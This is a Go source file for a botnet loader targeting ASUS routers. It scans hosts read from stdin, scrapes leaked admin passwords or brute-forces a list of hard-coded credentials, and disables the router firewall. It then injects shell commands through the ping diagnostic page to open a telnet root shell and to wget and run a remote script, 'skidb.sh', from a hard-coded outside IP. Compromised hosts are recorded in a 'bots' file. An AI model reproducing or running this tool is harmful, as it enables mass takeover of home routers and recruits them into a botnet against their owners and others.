package main

import (
	"net"
	"os"
	"bufio"
	"bytes"
	"encoding/base64"
	"io"
	"time"
	"regexp"
	"strings"
	"fmt"
	"crypto/tls"
	"sync"
)

var (
	port = os.Args[1]
	protocol = os.Args[2]

	conf = &tls.Config{
		InsecureSkipVerify: true,
	}

	timeout = 10 * time.Second

	processed uint64
	found uint64
	exploited uint64
	working uint64
	executed uint64

	wg sync.WaitGroup

	re = regexp.MustCompile(`if\('1' == '0' \|\| '(.+?)' == '(.+?)'\)`)

	creds = []string{"admin:Wf@b9?hJ", "admin:admin", "admin:password", "admin:asus", "admin:", "admin:admin1", "admin:admin1520", "admin:sakura1980", "admin:7120045", "admin:mp22vml108", "admin:ch7L3d9G", "admin:16032002", "admin:77553277", "admin:906Spirit777", "admin:admin1234", "admin:0389slam", "admin:This1sWiFi", "admin:Kwiki!2345!", "admin:&#38#fed73TRJNoi7()", "admin:Ghbvtytybt!", "admin:ZZprigorel123", "admin:ss127497oo", "admin:admin@", "admin:vor147", "admin:1985FybrbY5891", "admin:mQArq777tH9i!tG", "admin:nicepswd77", "admin:487317sokol", "admin:971CV1n8", "admin:Boriss333", "admin:mertx", "admin:YtnvBhfGodokbdvb", "admin:11051996m", "admin:bsa299yeb", "admin:rio13hih", "admin:pass33world", "admin:307750dv", "admin:ybpfrc2107", "admin:iatianymatonv", "admin:Dahuaforall1803", "admin:Miyagi0508!", "admin:g32167890", "admin:MaxAlex#123", "admin:3333333s", "admin:iberov", "admin:0000", "admin:5v/bb5ii"}

	SHELL = 0
	SHELL2 = 1

	telnetPort = "1337"

	exec_msg = "here we are"
	payload = "cd+%2Ftmp%3B+rm+-rf+skidb%3B+wget+http%3A%2F%2F45.88.67.38%2Fskidb.sh%3B+sh+skidb"
)

func waitForPrompt(conn net.Conn) bool {
	bufb := make([]byte, 4096)
	conn.Read(bufb)

	buf := string(bufb)

	if strings.Contains(buf, ":") || strings.Contains(buf, "#") || strings.Contains(buf, ">") || strings.Contains(buf, "$") {
		return true
	}

	return false
}

func waitForExec(conn net.Conn) bool {
	bufb := make([]byte, 4096)
	conn.Read(bufb)

	buf := string(bufb)

	return strings.Contains(buf, exec_msg)
}

func bruteDevice(target string) {

	var conn net.Conn
	var err error

	if protocol == "https" {
		conn, err = tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)
	} else {
		conn, err = net.DialTimeout("tcp", target, timeout)
	}

	if err != nil {
		return
	}

	defer conn.Close()

	step := SHELL

	fmt.Printf("[ASUS] [TELNET] connected to %s\n", target)
	working++

	for {

		switch step {
		case SHELL:
			if waitForPrompt(conn) {
				fmt.Printf("[ASUS] [TELNET] [%s] received shell, sending payload!\n", target);
				conn.Write([]byte(payload + "\r\n"))
				step = SHELL2
			}

		case SHELL2:
			if waitForExec(conn) {
				executed++

				fmt.Printf("[ASUS] [TELNET] [%s] ran payload\n", target);
				time.Sleep(5 * time.Second)
				conn.Write([]byte("killall busybox\r\n"))
				time.Sleep(5 * time.Second)
				fmt.Printf("[ASUS] [TELNET] [%s] exiting\n", target);
				return
			}
		}
	}

	return
}

func writeOutput(target string) {
	var addr string

	addr = strings.Split(target, ":")[0]

	file, err := os.OpenFile("asus_bots", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)

	if err != nil {
		return
	}

	defer file.Close()

	file.WriteString(addr + ":" + telnetPort + "\n")
}

func sendConfirm(target, auth, cred string) bool {
	var conn net.Conn
	var err error

	if protocol == "https" {
		conn, err = tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)
	} else {
		conn, err = net.DialTimeout("tcp", target, timeout)
	}

	if err != nil {
		return false
	}

	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	conn.Write([]byte("GET /Main_Analysis_Content.asp HTTP/1.0\r\nAuthorization: Basic " + auth + "\r\n\r\n"))

	var buffer bytes.Buffer
	io.Copy(&buffer, conn)

	if strings.Contains(buffer.String(), "HTTP/1.0 200 Ok") {
		fmt.Printf("[ASUS] exploited: %s (%s)\n", target, cred)
		//writeOutput(target)

		time.Sleep(5 * time.Second)

		ip := strings.Split(target, ":")
		bruteDevice(ip[0] + ":" + telnetPort)

		exploited++
		return true
	}

	return false
}

func sendPayload(target, cred string) bool {

	var conn net.Conn
	var err error

	if protocol == "https" {
		conn, err = tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)
	} else {
		conn, err = net.DialTimeout("tcp", target, timeout)
	}

	if err != nil {
		return false
	}

	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	auth := base64.StdEncoding.EncodeToString([]byte(cred))

	// think so
	conn.Write([]byte("GET /apply.cgi?current_page=Main_Analysis_Content.asp&next_page=Main_Analysis_Content.asp&group_id=&modified=0&action_mode=+Refresh+&action_script=&action_wait=&first_time=&preferred_lang=EN&SystemCmd=ping+-c+5+%24%28busybox+telnetd+-p6969+-l+%2Fbin%2Fsh%29&firmver=3.0.0.4&cmdMethod=ping&destIP=%24%28" + payload + "%29&pingCNT=1 HTTP/1.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0\r\nReferer: http://"+ target + "/Main_Analysis_Content.asp\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nHost: " + target + "\r\nAuthorization: Basic " + auth + "\r\n\r\n"))

	return sendConfirm(target, auth, cred)
}

func exploitDevice(target, cred string) bool {

	var conn net.Conn
	var err error

	if protocol == "https" {
		conn, err = tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)
	} else {
		conn, err = net.DialTimeout("tcp", target, timeout)
	}

	if err != nil {
		return false
	}

	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	auth := base64.StdEncoding.EncodeToString([]byte(cred))

	/* even if we cant reset it, we'll try anyways */
	if !resetFirewall(target, cred) {
		//fmt.Printf("[ASUS] failed to reset firewall for %s (%s)\n", target, cred)
		return false
	}

	// think so
	conn.Write([]byte("GET /apply.cgi?current_page=Main_Analysis_Content.asp&next_page=Main_Analysis_Content.asp&group_id=&modified=0&action_mode=+Refresh+&action_script=&action_wait=&first_time=&preferred_lang=EN&SystemCmd=ping+-c+5+%24%28busybox+telnetd+-p6969+-l+%2Fbin%2Fsh%29&firmver=3.0.0.4&cmdMethod=ping&destIP=%24%28busybox+telnetd+-p" + telnetPort + "+-l+%2Fbin%2Fsh%29&pingCNT=1 HTTP/1.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0\r\nReferer: http://"+ target + "/Main_Analysis_Content.asp\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nHost: " + target + "\r\nAuthorization: Basic " + auth + "\r\n\r\n"))

	return sendConfirm(target, auth, cred)
}

func findAuth(target string) string {
	var conn net.Conn
	var err error

	if protocol == "https" {
		conn, err = tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)
	} else {
		conn, err = net.DialTimeout("tcp", target, timeout)
	}

	if err != nil {
		return ""
	}

	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	conn.Write([]byte("GET /error_page.htm HTTP/1.0\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36\r\nConnection: close\r\n\r\n"))

	var buffer bytes.Buffer
	io.Copy(&buffer, conn)

	auth := re.FindAllString(buffer.String(), -1)

	if len(auth) == 0 {
		return ""
	}

	login := strings.Split(auth[0], "if('1' == '0' || '")[1]
	password := strings.Split(login, "'")[0]

	fmt.Printf("[LOADER] %s found leaked login: (admin:%s)\n", target, password)
	return password
}

func resetFirewall(target, cred string) bool {
	var conn net.Conn
	var err error

	if protocol == "https" {
		conn, err = tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)
	} else {
		conn, err = net.DialTimeout("tcp", target, timeout)
	}

	if err != nil {
		return false
	}

	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	auth := base64.StdEncoding.EncodeToString([]byte(cred))

	// think so
	conn.Write([]byte("POST /start_apply.htm HTTP/1.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0\r\nReferer: http://"+ target + "/Main_Analysis_Content.asp\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nContent-Length: 324\r\nHost: " + target + "\r\nAuthorization: Basic " + auth + "\r\n\r\ncurrent_page=Advanced_BasicFirewall_Content.asp&next_page=&next_host=212.75.138.206%3A8080&group_id=&modified=0&action_wait=5&action_mode=apply&action_script=restart_firewall&first_time=&preferred_lang=EN&firmver=3.0.0.4&fw_enable_x=0&fw_dos_x=0&misc_ping_x=0&st_webdav_mode=0&webdav_http_port=&webdav_https_port=&FAQ_input="))

	var buffer bytes.Buffer
	io.Copy(&buffer, conn)

	return strings.Contains(buffer.String(), "HTTP/1.0 200 Ok") || strings.Contains(buffer.String(), "HTTP/1.0 200 OK")
}

func findDevice(target string) bool {
	var conn net.Conn
	var err error

	if protocol == "https" {
		conn, err = tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)
	} else {
		conn, err = net.DialTimeout("tcp", target, timeout)
	}

	if err != nil {
		return false
	}

	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	// think so
	conn.Write([]byte("GET / HTTP/1.1\r\nAccept: */*\r\nUser-Agent: Hello World\r\n\r\n"))

	var buffer bytes.Buffer
	io.Copy(&buffer, conn)

	return strings.Contains(buffer.String(), "Server: httpd/2.0")
	//return strings.Contains(buffer.String(), "WWW-Authenticate: Basic realm=\"RT-") || strings.Contains(buffer.String(), "WWW-Authenticate: Basic realm=\"WL-")
}

func titleWriter() {
	for {
		fmt.Printf("[LOADER] Processed: %d | Found: %d | Exploited: %d | Executed: %d\n", processed, found, exploited, executed)
		time.Sleep(1 * time.Second)
	}
}

func loadDevice(target string) {

	wg.Add(1)
	defer wg.Done()

	processed++

	if !findDevice(target) {
		return
	}

	found++

	pass := findAuth(target)


	if len(pass) > 0 {
		fmt.Printf("[ASUS] found %s admin:%s\n", target, pass)
		sendPayload(target, "admin:" + pass)

		if exploitDevice(target, "admin:" + pass) {
			return
		}
	}

	for _, cred := range creds {
		if exploitDevice(target, cred) {
			fmt.Printf("[ASUS] %s:%s exploited\n", target, cred)
			return
		}
	}
}

func main() {
	scanner := bufio.NewScanner(os.Stdin)

	go titleWriter()

	for scanner.Scan() {
		if strings.Compare(port, "manual") == 0 {
			go loadDevice(scanner.Text())
		} else {
			go loadDevice(scanner.Text() + ":" + port)
		}
	}

	time.Sleep(10 * time.Second)
	wg.Wait()
}